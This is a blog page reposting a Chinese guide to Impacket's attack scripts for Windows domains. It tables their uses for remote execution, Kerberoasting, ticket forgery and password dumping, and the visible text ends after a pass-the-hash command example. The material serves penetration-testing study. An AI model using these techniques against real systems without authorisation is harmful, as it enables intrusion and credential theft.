<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="本篇转载自https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;11323 ，详细信息请查看原文，本文只是为了自己查资料方便。 Impacket脚本利用指南（上） Su1Xu3@深蓝攻防实验室 在平时的项目中，我们经常使用Impacket的脚本，例如Secretsdump、ntlmrelayx，但是实际上Impacket的利用除了示例脚本外还有很多，示例脚本只是其中一部分。因为Impacket的定">
<meta property="og:type" content="article">
<meta property="og:title" content="Impacket脚本使用">
<meta property="og:url" content="https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/index.html">
<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
<meta property="og:description" content="本篇转载自https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;11323 ，详细信息请查看原文，本文只是为了自己查资料方便。 Impacket脚本利用指南（上） Su1Xu3@深蓝攻防实验室 在平时的项目中，我们经常使用Impacket的脚本，例如Secretsdump、ntlmrelayx，但是实际上Impacket的利用除了示例脚本外还有很多，示例脚本只是其中一部分。因为Impacket的定">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124122856-82299bf8-6bb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124122920-909b866a-6bb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124122940-9ce681ae-6bb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123005-ab53a01e-6bb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123158-eed26a6e-6bb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123225-ff09fdac-6bb0-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123309-19264cea-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123320-2005f006-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123429-48cbe5a4-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123534-6f7ca594-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123542-743a237c-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123552-7a7de570-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123559-7e55e22e-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123608-83b309d6-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123615-8814309a-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123621-8bb3e8d0-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123631-9197cea6-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123644-9943f9fe-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123703-a49dcc44-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123713-aa8e4232-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123722-afd66ad0-6bb1-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124123733-b6d03d16-6bb1-1.png">
<meta property="article:published_time" content="2025-03-03T03:45:23.000Z">
<meta property="article:modified_time" content="2025-03-23T06:31:46.464Z">
<meta property="article:author" content="Oceanzbz">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="内网渗透">
<meta property="article:tag" content="脚本利用">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20221124122856-82299bf8-6bb0-1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Impacket脚本使用</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-QWTJSPQL4F');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/link/">Friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Certified/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&text=Impacket脚本使用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&is_video=false&description=Impacket脚本使用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Impacket脚本使用&body=Check out this article: https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&title=Impacket脚本使用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&name=Impacket脚本使用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/03/03/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/Impacket%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8/&t=Impacket脚本使用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Impacket脚本利用指南（上）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">Impacket的脚本介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">Impacket脚本使用实例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-number">3.1.</span> <span class="toc-text">通用选项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E8%AE%A4%E8%AF%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">hash认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81"><span class="toc-number">3.1.2.</span> <span class="toc-text">Kerberos认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E7%9B%AE%E6%A0%87IP"><span class="toc-number">3.1.3.</span> <span class="toc-text">指定目标IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%8E%A7IP"><span class="toc-number">3.1.4.</span> <span class="toc-text">指定域控IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.</span> <span class="toc-text">远程执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec-py"><span class="toc-number">3.2.1.</span> <span class="toc-text">psexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec-py"><span class="toc-number">3.2.2.</span> <span class="toc-text">smbexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-2"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-2"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#atexec-py"><span class="toc-number">3.2.3.</span> <span class="toc-text">atexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-3"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-3"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">3.2.4.</span> <span class="toc-text">wmiexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-4"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-4"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dcomexec-py"><span class="toc-number">3.2.5.</span> <span class="toc-text">dcomexec.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-5"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-5"><span class="toc-number">3.2.5.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.3.</span> <span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetTGT-py"><span class="toc-number">3.3.1.</span> <span class="toc-text">GetTGT.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-6"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetST-py"><span class="toc-number">3.3.2.</span> <span class="toc-text">GetST.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-7"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-6"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetPac-py"><span class="toc-number">3.3.3.</span> <span class="toc-text">GetPac.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-8"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetUserSPNs-py"><span class="toc-number">3.3.4.</span> <span class="toc-text">GetUserSPNs.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-9"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-7"><span class="toc-number">3.3.4.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetNPUsers-py"><span class="toc-number">3.3.5.</span> <span class="toc-text">GetNPUsers.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-10"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-8"><span class="toc-number">3.3.5.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rbcd-py"><span class="toc-number">3.3.6.</span> <span class="toc-text">rbcd.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-11"><span class="toc-number">3.3.6.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-9"><span class="toc-number">3.3.6.2.</span> <span class="toc-text">常用选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.3.6.3.</span> <span class="toc-text">利用实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0MAQ%E6%97%B6%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.6.4.</span> <span class="toc-text">无MAQ时的新利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ticketConverter-py"><span class="toc-number">3.3.7.</span> <span class="toc-text">ticketConverter.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-12"><span class="toc-number">3.3.7.1.</span> <span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ticketer-py"><span class="toc-number">3.3.8.</span> <span class="toc-text">ticketer.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-13"><span class="toc-number">3.3.8.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-10"><span class="toc-number">3.3.8.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#raiseChild-py-%E6%97%A0%E7%8E%AF%E5%A2%83"><span class="toc-number">3.3.9.</span> <span class="toc-text">raiseChild.py(无环境)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-14"><span class="toc-number">3.3.9.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-11"><span class="toc-number">3.3.9.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">Windows密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secretsdump-py"><span class="toc-number">3.4.1.</span> <span class="toc-text">secretsdump.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4-15"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9-12"><span class="toc-number">3.4.1.2.</span> <span class="toc-text">常用选项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-py"><span class="toc-number">3.4.2.</span> <span class="toc-text">mimikatz.py</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Impacket脚本使用
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Oceanzbz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-03T03:45:23.000Z" class="dt-published" itemprop="datePublished">2025-03-03</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>, <a class="p-category" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>, <a class="p-category" href="/tags/%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8/" rel="tag">脚本利用</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>本篇转载自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11323">https://xz.aliyun.com/news/11323</a> ，详细信息请查看原文，本文只是为了自己查资料方便。</p>
<h1>Impacket脚本利用指南（上）</h1>
<p>Su1Xu3@深蓝攻防实验室</p>
<p>在平时的项目中，我们经常使用Impacket的脚本，例如Secretsdump、ntlmrelayx，但是实际上Impacket的利用除了示例脚本外还有很多，示例脚本只是其中一部分。因为Impacket的定位是一个处理各种网络协议的Python类。提供对数据包的底层编程，并为某些协议提供对应的协议实现。</p>
<p>不过因为示例脚本的可用性、以及示例脚本存在多种用法。所以这篇文章旨在研究学习Impacket所有示例脚本的功能，并通过示例脚本学习Impacket库的使用。</p>
<h1>Impacket的脚本介绍</h1>
<p>以下是本篇文章将会介绍使用方法的脚本一览：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>脚本名</th>
<th>脚本介绍</th>
</tr>
</thead>
<tbody>
<tr>
<td>远程执行</td>
<td><a target="_blank" rel="noopener" href="http://psexec.py">psexec.py</a></td>
<td>使用了RemComSvc的实现了PSEXEC功能的脚本。</td>
</tr>
<tr>
<td>远程执行</td>
<td><a target="_blank" rel="noopener" href="http://smbexec.py">smbexec.py</a></td>
<td>类似PSECEX的执行方式，但未使用RemComSvc。这个脚本使用了一个本地SMB Server接收返回的结果，可以避免目标SMB没有可写的目录</td>
</tr>
<tr>
<td>远程执行</td>
<td><a target="_blank" rel="noopener" href="http://atexec.py">atexec.py</a></td>
<td>这个脚本通过MS-TSCH协议控制计划任务在目标机器上执行命令并获得回显</td>
</tr>
<tr>
<td>远程执行</td>
<td><a target="_blank" rel="noopener" href="http://wmiexec.py">wmiexec.py</a></td>
<td>通过WMI实现了半交互式的Shell，不需要在目标安装任何服务或软件。而且高度隐蔽的以管理员权限运行</td>
</tr>
<tr>
<td>远程执行</td>
<td><a target="_blank" rel="noopener" href="http://dcomexec.py">dcomexec.py</a></td>
<td>类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有<code>MMC20.Application</code>、<code>ShellWindows</code>、<code>ShellBrowserWindows</code></td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://GetTGT.py">GetTGT.py</a></td>
<td>提供密码、hash或aeskey用来请求TGT并且保存为ccache格式</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://GetST.py">GetST.py</a></td>
<td>提供密码、hash、aeskey或ccache格式的TGT，可以请求服务票据并保存为ccache格式。如果提供的账户存在约束委派且支持协议转换，那么可以使用-impersonate选项模拟为其他用户请求票据</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://GetPac.py">GetPac.py</a></td>
<td>这个脚本会为指定用户请求经过身份验证的PAC，通过使用MS-SFU协议的S4USelf和U2U的Kerberos认证实现</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://GetUserSPNs.py">GetUserSPNs.py</a></td>
<td>这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://GetNPUsers.py">GetNPUsers.py</a></td>
<td>这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://rbcd.py">rbcd.py</a></td>
<td>这个脚本可以处理目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://ticketConverter.py">ticketConverter.py</a></td>
<td>这个脚本可以在mimikatz常用的kirbi文件和Impacket常用的ccache文件之间进行转换</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://ticketer.py">ticketer.py</a></td>
<td>这个脚本可以基于模板或自己创建金、银票据，并允许你自定义PAC_LOGON_INFO、groups、ExtraSids、duration等属性</td>
</tr>
<tr>
<td>Kerberos协议</td>
<td><a target="_blank" rel="noopener" href="http://raiseChild.py">raiseChild.py</a></td>
<td>这个脚本通过金票据和ExtraSids实现从子域到域森林的提权</td>
</tr>
<tr>
<td>Windows密码</td>
<td><a target="_blank" rel="noopener" href="http://secretsdump.py">secretsdump.py</a></td>
<td>提供各种技术以不运行任何程序远程dump密码。对SAM和LSA以及缓存的凭据，会尝试从目标注册表中读取并将hives保存在<code>%SYSTEMROOT%\Temp</code>目录，再将hives读取回来。对于DIT文件，会使用<code>DL_DRSGetNCChanges</code>函数来dump目标的NTLM hash、明文密码和Kerberos keys。也可以通过smbexec或wmiexec执行vssadmin得到NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。</td>
</tr>
<tr>
<td>Windows密码</td>
<td><a target="_blank" rel="noopener" href="http://mimikatz.py">mimikatz.py</a></td>
<td>一个用来控制远程mimikatz RPC服务器的Shell，由@gentikiwi开发。</td>
</tr>
</tbody>
</table>
<h1>Impacket脚本使用实例</h1>
<h2 id="通用选项">通用选项</h2>
<h3 id="hash认证">hash认证</h3>
<p>py -3 <a target="_blank" rel="noopener" href="http://xxx.py">xxx.py</a> domain/user@ip -hashes :161cff084477fe596a5db81874498a24</p>
<h3 id="Kerberos认证">Kerberos认证</h3>
<p>export KRB5CCNAME=ad01.ccache<br>
